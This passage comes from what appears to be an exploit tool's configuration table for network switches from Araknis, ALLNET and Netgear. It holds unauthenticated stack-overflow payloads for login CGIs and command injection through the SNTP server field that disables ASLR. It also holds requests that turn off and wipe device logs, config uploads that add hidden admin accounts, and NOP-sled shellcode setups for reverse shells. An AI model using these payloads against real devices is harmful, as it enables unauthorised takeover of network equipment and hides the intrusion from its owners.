    'uri':'/cgi-bin/datajson.cgi?login',
    'content':'usr='+ self.random_string(324)+ '_JUMP_&pswrd='+ self.random_string(284) +'_CMD_',
    
    'workaround':False,# My LAB workaround
    'vulnerable': True,
    'safe': True
    },
    'stack_cgi_diag': {
    'description':'Stack overflow in "username/password" (PoC: Disable ASLR)',
    'authenticated': False,
    
    'uri':'/cgi-bin/datajson.cgi?login',
    'content':'usr='+ self.random_string(324)+ '_JUMP_&pswrd='+ self.random_string(284) +'_CMD_',
    'sys_ping_post_SIGSEGV': True,# SIGSEGV ?
    
    'workaround':False,# My LAB workaround
    'vulnerable': True,
    'safe': True
    
    },
    'stack_cgi_log': {
    'description':'Stack overflow in "username/password" (PoC: Disable/Clean logs)',
    'authenticated': False,
    'uri':'/cgi-bin/datajson.cgi?login',
    'content':'usr='+ self.random_string(324)+ '_JUMP_&pswrd='+ self.random_string(284) +'_CMD_',
    
    'log_settings_set_cmd':'&en=0',# Disable Logging CMD
    'log_settings_set_SIGSEGV':True,# Disable Logging SIGSEGV ?
    
    'log_ramClear_cmd':'&ta=0',# Clean RAM CMD
    'log_ramClear_SIGSEGV':True,# Clean RAM SIGSEGV ?
    
    'log_fileClear_cmd':'&ta=1',# Clean FILE log CMD
    'log_fileClear_SIGSEGV':True,# Clean FILE log SIGSEGV ?
    
    'workaround':False,# My LAB workaround
    'verify_uri':'',
    'vulnerable': True,
    'safe': True
    },
    'stack_cgi_sntp': {
    'description':'Stack overflow in "username/password" (PoC: Disable ASLR)',
    'authenticated': False,
    'uri':'/cgi-bin/datajson.cgi?login',
    'content':'usr='+ self.random_string(324)+ '_JUMP_&pswrd='+ self.random_string(284) +'_CMD_',
    
    'sys_timeSntp_set_cmd':'&sa=`echo 0 > /proc/sys/kernel/randomize_va_space`&sp=123',
    'sys_timeSntp_set_check':'&sa=`cat /proc/sys/kernel/randomize_va_space > /tmp/conf_tmp/check`&sp=123',
    
    'sys_timeSntpDel_set_cmd':'&sa=+&sp=123',# CMD
    
    'sys_timeSettings_set_cmd_enable':'&sn=1',# Enable CMD
    'sys_timeSettings_set_cmd_disable':'&sn=0',# Disable CMD
    'sys_timeSettings_set_SIGSEGV': True,# SIGSEGV ?
    
    'workaround':False,# My LAB workaround
    'verify_uri':'/conf_tmp/check',
    'vulnerable': True,
    'safe': True
    },
    #
    # Used for both 'heap' and 'stack'
    #
    'heack_cgi_shell': {
    'description':'Stack overflow in "username/password" (PoC: reverse shell)',
    'authenticated': False,
    'login_uri':'/cgi-bin/security.cgi?login',
    'logout_uri':'/cgi-bin/security.cgi?logout',
    'query':'build=NOP&heap=NOP&to=NOP&higher=addresses&usr=admin&pswrd=_PWDNOP_RA_START&shellcode=_USRNOP_SHELLCODE',
    #'stack':False, # False = use Heap, and there are no ASLR
    'workaround':False,# My LAB workaround
    'vulnerable': True,
    'safe': True
    },
    
    },
    },
    
    'Araknis': {
    'vendor': 'Araknis Networks',
    'modulus_uri':'',
    'info_leak':True,
    'info_leak_JSON':False,
    'info_leak_uri':'/loginMsg.js',
    'xsid':False,
    'xsid_uri':'',
    'login': {
    'description':'Login/Logout on remote device',
    'authenticated': True,
    'json':True,
    'encryption':'',
    'login_uri':'',
    'query':'',
    'status_uri':'',
    'logout_uri':'',
    'vulnerable': False,
    'safe': True
    },
    'login': {
    'description':'Login/Logout on remote device',
    'authenticated': True,
    'json':True,
    'encryption':'',
    'login_uri':'',
    'query':'',
    'status_uri':'',
    'logout_uri':'',
    'vulnerable': False,
    'safe': True
    },
    'log':{
    'description':'Disable and clean logs',
    'authenticated': True,
    'json':True,
    'disable_uri':'',
    'disable_query':'',
    'status':'',
    'clean_logfile_uri':'',
    'clean_logfile_query':'',
    'clean_logmem_uri':'',
    'clean_logmem_query':'',
    'vulnerable': False,
    'safe': True
    },
    # Verify lacking authentication
    'verify': {
    'security.cgi': { # 'username' also suffer from stack overflow
    'description':'Stack overflow in "username/password" (PoC: crash CGI)',
    'authenticated': False,
    'response':'502',
    'Content-Type':False,
    'uri':'/cgi-bin/security.cgi?login',
    'content':'usr=admin&pswrd=' + self.random_string(280),
    'check_uri':False,
    'content_check':False,
    'vulnerable': True,
    'safe': True
    },
    'datajson.cgi': { # 'username' also suffer from stack overflow
    'description':'Stack overflow in "username/password" (PoC: crash CGI)',
    'authenticated': False,
    'response':'502',
    'Content-Type':False,
    'uri':'/cgi-bin/datajson.cgi?login',
    'content':'usr=admin&pswrd=' + self.random_string(288),
    'check_uri':False,
    'content_check':False,
    'vulnerable': True,
    'safe': True
    },
    },
    'exploit': {
    'heack_hydra_shell': {
    'description':'[Boa/Hydra] Stack overflow in Boa/Hydra web server (PoC: reverse shell)',
    'authenticated': False,
    'uri':'/cgi-bin/sn_httpupload.cgi?', # Including alignment of opcodes in memory
    'vulnerable': True,
    'safe': False # Boa/Hydra restart/watchdog, False = no restart, True = restart
    },
    'priv15_account': {
    'description':'Upload/Update running-config (PoC: add priv 15 credentials)',
    'authenticated': False,
    'json':True,
    'encryption':'',
    'content':'',
    'add_uri':'',
    'del_query':'',
    'del_uri':'',
    'vulnerable': False,
    'safe': True
    },
    'sntp': {
    'description':'SNTP command injection (PoC: disable ASLR)',
    'json':True,
    'authenticated': True,# <================================
    'enable_uri':'/cgi/set.cgi?cmd=sys_timeSettings',
    'enable_query':'{"_ds=1&sntpStatus=1&_de=1":{}}',
    'status_uri':'/cgi/get.cgi?cmd=sys_timeSettings',
    'inject_uri':'/cgi/set.cgi?cmd=sys_timeSntp',
    'inject_query':'{"_ds=1&srvDef=byIp&sntpServer=`echo 0 > /proc/sys/kernel/randomize_va_space`&cursntpPort=123&_de=1":{}}',
    'check_query':'{"_ds=1&srvDef=byIp&sntpServer=`cat /proc/sys/kernel/randomize_va_space > /tmp/check`&cursntpPort=123&_de=1":{}}',
    'delete_uri':'/cgi/set.cgi?cmd=sys_timeSntpDel',
    'delete_query':'{"":{}}',
    'disable_uri':'/cgi/set.cgi?cmd=sys_timeSettings',
    'disable_query':'{"_ds=1&sntpStatus=0&_de=1":{}}',
    'verify_uri':'/tmp/check',
    'vulnerable': False, # It is vulnerable, but I am not using this authenticated code here :>
    'safe': True
    },
    #
    # The stack overflow in 'username' and 'password' at same request are multipurpose.
    #
    
    #
    # The trick to jump and execute:
    # 1. Code: username=[garbage][RA + 0x58000000]&password=[garbage][NULL termination]
    # 2. [NULL termination] will overwrite 0x58 in RA so we can jump within the binary
    # 3. We dont jump to beginning of the functions, we jump just after 'sw $ra,($sp)' (important)
    # 4. We will also feed required function parameters, by adding them to '_CMD_'
    #
    'stack_cgi_add_account': {
    'description':'Stack overflow in "username/password" (PoC: add priv 15 credentials)',
    'authenticated': False,
    'uri':'/cgi-bin/datajson.cgi?login',
    'content':'usr='+ self.random_string(324)+ '_JUMP_&pswrd='+ self.random_string(284) +'_CMD_',
    
    'workaround':False,# My LAB workaround
    'vulnerable': True,
    'safe': True
    },
    'stack_cgi_del_account': {
    'description':'Stack overflow in "username/password" (PoC: del priv 15 credentials)',
    'authenticated': False,
    'uri':'/cgi-bin/datajson.cgi?login',
    'content':'usr='+ self.random_string(324)+ '_JUMP_&pswrd='+ self.random_string(284) +'_CMD_',
    
    'workaround':False,# My LAB workaround
    'vulnerable': True,
    'safe': True
    },
    'stack_cgi_diag': {
    'description':'Stack overflow in "username/password" (PoC: Disable ASLR)',
    'authenticated': False,
    
    'uri':'/cgi-bin/datajson.cgi?login',
    'content':'usr='+ self.random_string(324)+ '_JUMP_&pswrd='+ self.random_string(284) +'_CMD_',
    'sys_ping_post_SIGSEGV': True,# SIGSEGV ?
    
    'workaround':False,# My LAB workaround
    'vulnerable': True,
    'safe': True
    
    },
    'stack_cgi_log': {
    'description':'Stack overflow in "username/password" (PoC: Disable/Clean logs)',
    'authenticated': False,
    'uri':'/cgi-bin/datajson.cgi?login',
    'content':'usr='+ self.random_string(324)+ '_JUMP_&pswrd='+ self.random_string(284) +'_CMD_',
    
    'log_settings_set_cmd':'&en=0',# Disable Logging CMD
    'log_settings_set_SIGSEGV':True,# Disable Logging SIGSEGV ?
    
    'log_ramClear_cmd':'&ta=0',# Clean RAM CMD
    'log_ramClear_SIGSEGV':True,# Clean RAM SIGSEGV ?
    
    'log_fileClear_cmd':'&ta=1',# Clean FILE log CMD
    'log_fileClear_SIGSEGV':True,# Clean FILE log SIGSEGV ?
    
    'workaround':False,# My LAB workaround
    'verify_uri':'',
    'vulnerable': True,
    'safe': True
    },
    'stack_cgi_sntp': {
    'description':'Stack overflow in "username/password" (PoC: Disable ASLR)',
    'authenticated': False,
    'uri':'/cgi-bin/datajson.cgi?login',
    'content':'usr='+ self.random_string(324)+ '_JUMP_&pswrd='+ self.random_string(284) +'_CMD_',
    
    'sys_timeSntp_set_cmd':'&sa=`echo 0 > /proc/sys/kernel/randomize_va_space`&sp=123',
    'sys_timeSntp_set_check':'&sa=`cat /proc/sys/kernel/randomize_va_space > /tmp/conf_tmp/check`&sp=123',
    
    'sys_timeSntpDel_set_cmd':'&sa=+&sp=123',# CMD
    
    'sys_timeSettings_set_cmd_enable':'&sn=1',# Enable CMD
    'sys_timeSettings_set_cmd_disable':'&sn=0',# Disable CMD
    'sys_timeSettings_set_SIGSEGV': True,# SIGSEGV ?
    
    'workaround':False,# My LAB workaround
    'verify_uri':'/conf_tmp/check',
    'vulnerable': True,
    'safe': True
    },
    #
    # Used for both 'heap' and 'stack'
    #
    'heack_cgi_shell': {
    'description':'Stack overflow in "username/password" (PoC: reverse shell)',
    'authenticated': False,
    'login_uri':'/cgi-bin/security.cgi?login',
    'logout_uri':'/cgi-bin/security.cgi?logout',
    'query':'build=NOP&heap=NOP&to=NOP&higher=addresses&usr=admin&pswrd=_PWDNOP_RA_START&shellcode=_USRNOP_SHELLCODE',
    'stack':False, # False = use Heap, and there are no ASLR
    'workaround':False,# My LAB workaround
    'vulnerable': True,
    'safe': True
    },
    
    },
    },
    
    'ALLNET_JSON': {
    'vendor': 'ALLNET GmbH Computersysteme',
    'model':'ALL-SG82xx',
    'uri':'https://www.allnet.de/',
    'modulus_uri':'/cgi/get.cgi?cmd=home_login',
    'info_leak':False,
    'info_leak_JSON':True,
    'info_leak_uri':'/cgi/get.cgi?cmd=home_login',
    'xsid':False,
    'xsid_uri':'/cgi/get.cgi?cmd=home_main',
    'login': {
    'description':'Login/Logout on remote device',
    'authenticated': True,
    'json':True,
    'encryption':'rsa',
    'login_uri':'/cgi/set.cgi?cmd=home_loginAuth',
    'query':'{"_ds=1&username=USERNAME&password=PASSWORD&_de=1":{}}',
    'status_uri':'/cgi/get.cgi?cmd=home_loginStatus',
    'logout_uri':'/cgi/set.cgi?cmd=home_logout',
    'vulnerable': True,
    'safe': True
    },
    'log':{
    'description':'Disable and clean logs',
    'authenticated': True,
    'json':True,
    'disable_uri':'/cgi/set.cgi?cmd=log_global',
    'disable_query':'{"_ds=1&empty=1&_de=1":{}}',
    'status':'/cgi/get.cgi?cmd=log_global',
    'clean_logfile_uri':'/cgi/set.cgi?cmd=log_clear',
    'clean_logfile_query':'{"_ds=1&target=1&_de=1":{}}',
    'clean_logmem_uri':'/cgi/set.cgi?cmd=log_clear',
    'clean_logmem_query':'{"_ds=1&target=0&_de=1":{}}',
    'vulnerable': True,
    'safe': True
    },
    # Verify lacking authentication
    'verify': {
    'httpuploadruncfg.cgi':{
    'authenticated': False,
    'response':'file',
    'Content-Type':True,
    'description':'Upload/update "running-config" (PoC: Create invalid file to verify)',
    'uri':'/cgi/httpuploadruncfg.cgi',
    'check_uri':'/tmp/http_saverun_cfg',
    'content':'/var/config/running-config',
    'content_check':'/var/config/running-config',
    'vulnerable': True,
    'safe': True
    },
    'httprestorecfg.cgi':{
    'authenticated': False,
    'response':'file',
    'Content-Type':True,
    'description':'Upload "startup-config" (PoC: Create invalid file to verify)',
    'uri':'/cgi/httprestorecfg.cgi',
    'check_uri':'/tmp/startup-config',
    'content':'/mnt/startup-config',
    'content_check':'/mnt/startup-config',
    'vulnerable': True,
    'safe': True
    },
    'httpupload.cgi':{
    'authenticated': False,
    'response':'file',
    'Content-Type':True,
    'description':'Upload/Upgrade "Firmware" (PoC: Create invalid file to verify)',
    'uri':'/cgi-bin/httpupload.cgi',
    'check_uri':'/tmp/http_uploadfail',
    'content':'Copy: Illegal software format', # Not the real content, its the result of invalid firmware (workaround)
    'content_check':'Copy: Illegal software format',
    'vulnerable': True,
    'safe': True
    },
    'login.cgi': {
    'description':'Stack overflow in login.cgi (PoC: create file /tmp/VUL.TXT)',
    'authenticated': False,
    'response':'file',
    'Content-Type':False,
    'uri':'/cgi/set.cgi?cmd=home_loginAuth',
    'check_uri':'/tmp/VUL.TXT', # We cannot control the content...
    'content':'{"_ds=1&username='+ self.random_string(40) +'&password='+ '/' * 23 +'/tmp/VUL.TXT&_de=1":{}}',
    'content_check':'2',
    'vulnerable': True,
    'safe': True
    },
    'set.cgi': { # 'username' also suffer from stack overflow
    'description':'Stack overflow in "username/password" (PoC: crash CGI)',
    'authenticated': False,
    'response':'502',
    'Content-Type':False,
    'uri':'/cgi/set.cgi?cmd=home_loginAuth',
    'content':'{"_ds=1&username=admin&password=' + self.random_string(312) + '&_de=1":{}}',
    'check_uri':False,
    'content_check':False,
    'vulnerable': True,
    'safe': True
    },
    },
    'exploit': {
    'heack_hydra_shell': {
    'description':'[Boa/Hydra] Stack overflow in Boa/Hydra web server (PoC: reverse shell)',
    'authenticated': False,
    'uri':'/cgi-bin/httpupload.cgi?XXX', # Including alignment of opcodes in memory
    'vulnerable': True,
    'safe': False # Boa/Hydra restart/watchdog, False = no restart, True = restart
    },
    'priv15_account': {
    'description':'Upload/Update running-config (PoC: add priv 15 credentials)',
    'authenticated': False,
    'json':True,
    'encryption':'clear',
    'content':'Content-Type\n\nSYSTEM CONFIG FILE ::= BEGIN\nusername "USERNAME" password PASSWORD\n\n------',
    'add_uri':'/cgi/httpuploadruncfg.cgi',
    'del_query':'{"_ds=1&user=USERNAME&_de=1":{}}',
    'del_uri':'/cgi/set.cgi?cmd=sys_acctDel',
    'vulnerable': True,
    'safe': True
    },
    'sntp': {
    'description':'SNTP command injection (PoC: disable ASLR)',
    'json':True,
    'authenticated': True,
    'enable_uri':'/cgi/set.cgi?cmd=sys_time',
    'enable_query':'{"_ds=1&sntp=1&_de=1":{}}',
    'status_uri':'/cgi/get.cgi?cmd=sys_time',
    'inject_uri':'/cgi/set.cgi?cmd=sys_time',
    'inject_query':'{"_ds=1&sntp=1&srvDef=ipv4&srvHost=`echo 0 > /proc/sys/kernel/randomize_va_space`&port=139&_de=1":{}}',
    'check_query':'{"_ds=1&sntp=1&srvDef=ipv4&srvHost=`cat /proc/sys/kernel/randomize_va_space > /tmp/check`&port=139&_de=1":{}}',
    'delete_uri':'/cgi/set.cgi?cmd=sys_time',
    'delete_query':'{"_ds=1&sntp=1&timezone=0&srvDef=ipv4&srvHost=+&port=0&dlsType=0&_de=1":{}}',
    'disable_uri':'/cgi/set.cgi?cmd=sys_time',
    'disable_query':'{"_ds=1&sntp=0&_de=1":{}}',
    'verify_uri':'/tmp/check',
    'vulnerable': True,
    'safe': True
    },
    #
    # The stack overflow in 'username' and 'password' at same request are multipurpose.
    #
    
    #
    # The trick to jump and execute:
    # 1. Code: username=[garbage][RA + 0x58000000]&password=[garbage][NULL termination]
    # 2. [NULL termination] will overwrite 0x58 in RA so we can jump within the binary
    # 3. We dont jump to beginning of the functions, we jump just after 'sw $ra,($sp)' (important)
    # 4. We will also feed required function parameters, by adding them to '_CMD_'
    #
    'stack_cgi_diag': {# Not vulnerable
    'vulnerable': False,
    },
    'stack_cgi_log': {
    'description':'Stack overflow in "username/password" (PoC: Disable/Clean logs)',
    'authenticated': False,
    'uri':'/cgi/set.cgi?cmd=home_loginAuth',
    'content':'{"_ds=1&username='+ self.random_string(348)+ '_JUMP_&password='+ self.random_string(308) +'_CMD_&_de=1":{}}',
    
    #'log_settings_set_cmd':'&logState=1&consoleState=1&ramState=1&fileState=1',# Enable Logging CMD
    'log_settings_set_cmd':'&empty=1',# Disable Logging CMD
    'log_settings_set_SIGSEGV':True,# Disable Logging SIGSEGV ?
    
    'log_ramClear_cmd':'&target=0',# Clean RAM CMD
    'log_ramClear_SIGSEGV':True,# Clean RAM SIGSEGV ?
    
    'log_fileClear_cmd':'&target=1',# Clean FILE log CMD
    'log_fileClear_SIGSEGV':True,# Clean FILE log SIGSEGV ?
    
    'workaround':False,# My LAB workaround
    'verify_uri':'',
    'vulnerable': True,
    'safe': True
    },
    'stack_cgi_sntp': {
    'description':'Stack overflow in "username/password" (PoC: Disable ASLR)',
    'authenticated': False,
    'uri':'/cgi/set.cgi?cmd=home_loginAuth',
    'content':'{"_ds=1&username='+ self.random_string(348)+ '_JUMP_&password='+ self.random_string(308) +'_CMD_&_de=1":{}}',
    'sys_timeSntp_set_cmd':'&sntp=1&srvDef=ipv4&srvHost=`echo 0 > /proc/sys/kernel/randomize_va_space`&port=139',
    'sys_timeSntp_set_check':'&sntp=1&srvDef=ipv4&srvHost=`cat /proc/sys/kernel/randomize_va_space > /tmp/check`&port=139',
    
    'sys_timeSntpDel_set_cmd':'&sntp=1&srvDef=ipv4&srvHost=+&port=139',# CMD
    
    'sys_timeSettings_set_cmd_enable':'&sntp=1',# Enable CMD
    'sys_timeSettings_set_cmd_disable':'&sntp=0',# Disable CMD
    'sys_timeSettings_set_SIGSEGV': True,# SIGSEGV ?
    
    'workaround':False,# My LAB workaround
    'verify_uri':'/tmp/check',
    'vulnerable': False,
    #'vulnerable': True,
    'safe': True
    },
    #
    # After disabled ASLR, we can proceed to put NOP sled and shellcode on stack.
    # Then we will start walk down from top of stack to hit the NOP sled to execute shellcode
    #
    'heack_cgi_shell': {
    'description':'Stack overflow in "username/password" (PoC: reverse shell)',
    'authenticated': False,
    'login_uri':'/cgi/set.cgi?cmd=home_loginAuth',
    'logout_uri':'/cgi/set.cgi?cmd=home_logout',
    'query':'{"_ds=1&username=_ALIGN_USRNOP_SHELLCODE&password=_PWDNOP_RA_START&_de=1":{}}',
    'stack':True, # False = use Heap, and there are no ASLR
    'workaround':False,# My LAB workaround
    'vulnerable': True,
    'safe': True
    },
    
    },
    },
    
    'ALLNET': {
    'vendor': 'ALLNET GmbH Computersysteme',
    'uri':'https://www.allnet.de/',
    'modulus_uri':'',
    'info_leak':False,
    'info_leak_JSON':False,
    'info_leak_uri':'',
    'xsid':False,
    'xsid_uri':'',
    'login': {
    'description':'Login/Logout on remote device',
    'authenticated': True,
    'json':False,
    'encryption':'clear',
    'login_uri':'/cgi-bin/dispatcher.cgi?cmd=1',
    'query':'username=USERNAME&password=PASSWORD&login=1',
    'status_uri':'/cgi-bin/dispatcher.cgi?cmd=547',
    'logout_uri':'/cgi-bin/dispatcher.cgi?cmd=3',
    'vulnerable': True,
    'safe': True
    },
    'log':{
    'description':'Disable and clean logs',
    'authenticated': True,
    'json':False,
    'disable_uri':'/cgi-bin/dispatcher.cgi',
    'disable_query':'LOGGING_SERVICE=0&cmd=4353',
    'status':'/cgi-bin/dispatcher.cgi?cmd=4352',
    'clean_logfile_uri':'/cgi-bin/dispatcher.cgi',
    'clean_logfile_query':'cmd_4364=Clear+file+messages',
    'clean_logmem_uri':'/cgi-bin/dispatcher.cgi',
    'clean_logmem_query':'cmd_4364=Clear+buffered+messages',
    'vulnerable': True,
    'safe': True
    },
    # Verify lacking authentication
    'verify': {
    'httpuploadbakcfg.cgi':{
    'authenticated': False,
    'response':'html',
    'Content-Type':True,
    'description':'Upload "backup-config" (PoC: Create invalid file to verify)',
    'uri':'/cgi-bin/httpuploadbakcfg.cgi',
    'check_uri':'',
    'content':'dummy',
    'content_check':' Invalid config file!!', # one 0x20 in beginning
    'vulnerable': True,
    'safe': True
    },
    'httpuploadruncfg.cgi':{
    'authenticated': False,
    'response':'html',
    'Content-Type':True,
    'description':'Upload/update "running-config" (PoC: Create invalid file to verify)',
    'uri':'/cgi-bin/httpuploadruncfg.cgi',
    'check_uri':'',
    'content':'dummy',
    'content_check':' Invalid config file!!', # one 0x20 in beginning
    'vulnerable': True,
    'safe': True
    },
    'httprestorecfg.cgi':{
    'authenticated': False,
    'response':'html',
    'Content-Type':True,
    'description':'Upload "startup-config" (PoC: Create invalid file to verify)',
    'uri':'/cgi-bin/httprestorecfg.cgi',
    'check_uri':'',
    'content':'dummy',
    'content_check':' Invalid config file!!', # one 0x20 in beginning
    'vulnerable': True,
    'safe': True
    },
    'httpupload.cgi':{
    'authenticated': False,
    'response':'html',
    'Content-Type':True,
    'description':'Upload/Upgrade "Firmware" (PoC: Create invalid file to verify)',
    'uri':'/cgi-bin/httpupload.cgi',
    'check_uri':'',
    'content':'dummy',
    'content_check':'Image Signature Error',
    'vulnerable': True,
    'safe': True
    },
    'dispatcher.cgi': { # 'username' also suffer from stack overflow
    'description':'Stack overflow in "username/password" (PoC: crash CGI)',
    'response':'502',
    'Content-Type':False,
    'authenticated': False,
    'uri':'/cgi-bin/dispatcher.cgi?cmd=1',
    'content':'username=admin&password='+ self.random_string(184) + '&login=1',
    'check_uri':False,
    'content_check':False,
    'vulnerable': True,
    'safe': True
    },
    'httpuploadfirmware.cgi':{
    'authenticated': False,
    'response':'html',
    'Content-Type':True,
    'description':'Upload/Upgrade "Firmware" (PoC: Create invalid file to verify)',
    'uri':'/cgi-bin/httpuploadfirmware.cgi',
    'check_uri':'',
    'content':'dummy',
    'content_check':'Image Signature Error',
    'vulnerable': True,
    'safe': True
    },
    'httpupload_runstart_cfg.cgi':{
    'authenticated': False,
    'response':'file',
    'Content-Type':True,
    'description':'Upload/update "running-config" (PoC: Create invalid file to verify)',
    'uri':'/cgi-bin/httpupload_runstart_cfg.cgi',
    'check_uri':'/tmp/startup-config',
    'content':'/tmp/startup-config',
    'content_check':'/tmp/startup-config',
    'vulnerable': True,
    'safe': True
    },
    'version_upgrade.cgi':{
    'authenticated': False,
    'response':'html',
    'Content-Type':True,
    'description':'Upload/Upgrade "Firmware" (Frontend to "httpuploadfirmware.cgi")',
    'uri':'/cgi-bin/version_upgrade.cgi',
    'check_uri':'',
    'content':'Firm Upgrade',
    'content_check':'Firm Upgrade',
    'vulnerable': True,
    'safe': True
    },
    'factory_reset.cgi':{
    'authenticated': False,
    'response':'html',
    'Content-Type':True,
    'description':'Reset device to factory default (PoC: Too dangerous to verify)',
    'uri':'/cgi-bin/factory_reset.cgi',
    'check_uri':'',
    'content':'Too dangerous to verify',
    'content_check':'dummy',
    'vulnerable': True,
    'safe': False
    },
    'sysinfo_config.cgi':{
    'authenticated': False,
    'response':'html',
    'Content-Type':False,
    'description':'System basic information configuration (Frontend to "change_mac_addr_set.cgi")',
    'uri':'/cgi-bin/sysinfo_config.cgi',
    'check_uri':'',
    'content':'dummy',
    'content_check':'"/cgi-bin/change_mac_addr_set',
    'vulnerable': True,
    'safe': True
    },
    'change_mac_addr_set.cgi': {
    'description':'Stack overflow in "switch_type/sys_hardver" (PoC: crash CGI)',
    'response':'502',
    'Content-Type':False,
    'authenticated': False,
    'uri':'/cgi-bin/change_mac_addr_set.cgi',
    'content':'switch_type='+ self.random_string(116) +'&sys_hardver=31337&sys_macaddr=DE:AD:BE:EF:13:37&sys_serialnumber=DE:AD:BE:EF:13:37&password=tgnetadmin',
    'check_uri':False,
    'content_check':False,
    'vulnerable': True,
    'safe': True
    },
    
    },
    'exploit': {
    'heack_hydra_shell': {
    'description':'[Boa/Hydra] Stack overflow in Boa/Hydra web server (PoC: reverse shell)',
    'authenticated': False,
    'uri':'/cgi-bin/httpupload.cgi?XXX', # Including alignment of opcodes in memory
    'vulnerable': True,
    'safe': False # Boa/Hydra restart/watchdog, False = no restart, True = restart
    },
    'priv15_account': {
    'description':'Upload/Update running-config (PoC: add priv 15 credentials)',
    'json':False,
    'authenticated': False,
    'encryption':'clear',
    'content':'Content-Type\n\nSYSTEM CONFIG FILE ::= BEGIN\nusername "USERNAME" password PASSWORD\n\n------',
    'add_uri':'/cgi-bin/httpuploadruncfg.cgi',
    'del_query':'',
    'del_uri':'/cgi-bin/dispatcher.cgi?cmd=524&usrName=USERNAME',
    'vulnerable': True,
    'safe': True
    },
    'sntp': {
    'description':'SNTP command injection (PoC: disable ASLR)',
    'json':False,
    'authenticated': True,
    'enable_uri':'/cgi-bin/dispatcher.cgi',
    'enable_query':'sntp_enable=1&cmd=548',
    'status_uri':'cmd=547',
    'inject_uri':'/cgi-bin/dispatcher.cgi',
    
    'inject_query':'sntp_Server=`echo 0 > /proc/sys/kernel/randomize_va_space`&sntp_Port=123&cmd=550',
    'check_query':'sntp_Server=`cat /proc/sys/kernel/randomize_va_space > /tmp/check`&sntp_Port=123&cmd=550',
    
    'delete_uri':'/cgi-bin/dispatcher.cgi',
    'delete_query':'sntp_Server=+&sntp_Port=123&cmd=550',
    'disable_uri':'/cgi-bin/dispatcher.cgi',
    'disable_query':'sntp_enable=0&cmd=548',
    'verify_uri':'/tmp/check',
    'vulnerable': True,
    'safe': True
    },
    
    #
    # The stack overflow in 'username' and 'password' at same request are multipurpose.
    #
    
    #
    # The trick to jump and execute:
    # 1. Code: username=[garbage][RA + 0x58000000]&password=[garbage][NULL termination]
    # 2. [NULL termination] will overwrite 0x58 in RA so we can jump within the binary
    # 3. We dont jump to beginning of the functions, we jump just after 'sw $ra,($sp)' (important)
    # 4. We will also feed required function parameters, by adding them to '_CMD_'
    #
    'stack_cgi_diag': {
    'vulnerable': False,
    },
    'stack_cgi_log': {
    'description':'Stack overflow in "username/password" (PoC: Disable/Clean logs)',
    'authenticated': False,
    'uri':'/cgi-bin/dispatcher.cgi?cmd=1',
    'content':'username='+ self.random_string(112) +'_JUMP_&password='+ self.random_string(80) +'_CMD_&login=1',
    
    'log_settings_set_cmd':'&LOGGING_SERVICE=0',# Disable Logging CMD
    'log_settings_set_SIGSEGV':True,# Disable Logging SIGSEGV ?
    
    'log_ramClear_cmd':'',# Clean RAM log CMD
    'log_ramClear_SIGSEGV':False,# Clean RAM log SIGSEGV ?
    
    'log_fileClear_cmd':'',# Clean FILE log CMD
    'log_fileClear_SIGSEGV':False,# Clean FILE log SIGSEGV ?
    
    'workaround':False,# My LAB workaround
    'verify_uri':'/tmp/check',
    'vulnerable': True,
    'safe': True
    },
    'stack_cgi_sntp': {
    'description':'Stack overflow in "username/password" (PoC: Disable ASLR)',
    'authenticated': False,
    'uri':'/cgi-bin/dispatcher.cgi?cmd=1',
    'content':'username='+ self.random_string(112) +'_JUMP_&password='+ self.random_string(80) +'_CMD_&login=1',
    'sys_timeSntp_set_cmd':'&sntp_Server=`echo 0 > /proc/sys/kernel/randomize_va_space`&sntp_Port=123',
    'sys_timeSntp_set_check':'&sntp_Server=`cat /proc/sys/kernel/randomize_va_space > /tmp/check`&sntp_Port=123',
    'sys_timeSntpDel_set_cmd':'&sntp_Server=+&sntp_Port=123',
    'sys_timeSettings_set_cmd_enable':'&sntp_enable=1',
    'sys_timeSettings_set_cmd_disable':'&sntp_enable=0',
    'sys_timeSettings_set_SIGSEGV': False,# SIGSEGV ?
    'workaround':True,# My LAB workaround
    'verify_uri':'/tmp/check',
    'vulnerable': True,
    'safe': True
    },
    
    #
    # After disabled ASLR, we can proceed to put NOP sled and shellcode on stack.
    # Then we will start walk down from top of stack to hit the NOP sled to execute shellcode
    #
    'heack_cgi_shell': {
    'description':'Stack overflow in "username/password" (PoC: reverse shell)',
    'authenticated': False,
    'login_uri':'/cgi-bin/dispatcher.cgi?cmd=1',
    'logout_uri':'/cgi-bin/dispatcher.cgi?cmd=3',
    'query':'username=_ALIGN_USRNOP_SHELLCODE&password=_PWDNOP_RA_START&login=1',
    'workaround':False,# My LAB workaround
    #'stack':False, # False = use Heap, and there are no ASLR
    'stack':True, # False = use Heap, and there are no ASLR
    'vulnerable': True,
    'safe': True
    },
    
    },
    },
    
    'Netgear': {
    'vendor': 'NETGEAR Inc.',
    'modulus_uri':'/cgi/get.cgi?cmd=home_login',
    'info_leak':True,
    'info_leak_JSON':True,
    'info_leak_uri':'/cgi/get.cgi?cmd=home_login',
    'xsid':False,
    'xsid_uri':'/cgi/get.cgi?cmd=home_main',
    'login': {
    'description':'Login/Logout on remote device',
    'authenticated': True,
    'json':True,
    'encryption':'rsa',
    'login_uri':'/cgi/set.cgi?cmd=home_loginAuth',
    'query':'{"_ds=1&username=USERNAME&password=PASSWORD&_de=1":{}}',
    'status_uri':'/cgi/get.cgi?cmd=home_loginStatus',
    'logout_uri':'/cgi/set.cgi?cmd=home_logout',
    'vulnerable': False,
    'safe': True
    },
    'log':{
    'description':'Disable and clean logs',
    'authenticated': True,
    'json':True,
    'disable_uri':'/cgi/set.cgi?cmd=log_settings',
    'disable_query':'{"_ds=1&ram_sev_0=on&ram_sev_1=on&ram_sev_2=on&ram_sev_3=on&ram_sev_4=on&ram_sev_5=on&ram_sev_6=on&_de=1":{}}',
    'status':'/cgi/get.cgi?cmd=log_settings',
    'clean_logfile_uri':'/cgi/set.cgi?cmd=log_fileClear',
    'clean_logfile_query':'{"":{}}',
    'clean_logmem_uri':'/cgi/set.cgi?cmd=log_ramClear',
    'clean_logmem_query':'{"":{}}',
    'vulnerable': False,
    'safe': True
    },
    # Verify lacking authentication
    'verify': {
    'set.cgi': { # 'username' also suffer from stack overflow
    'description':'Stack overflow in "username/password" (PoC: crash CGI)',
    'authenticated': False,
    'response':'502',
    'Content-Type':False,
    'uri':'/cgi/set.cgi?cmd=home_loginAuth',
    'content':'{"_ds=1&username=admin&password=' + self.random_string(312) + '&_de=1":{}}',
    'check_uri':False,
    'content_check':False,
    'vulnerable': True,
    'safe': True
    },
    },
    'exploit': {
    'heack_hydra_shell': {
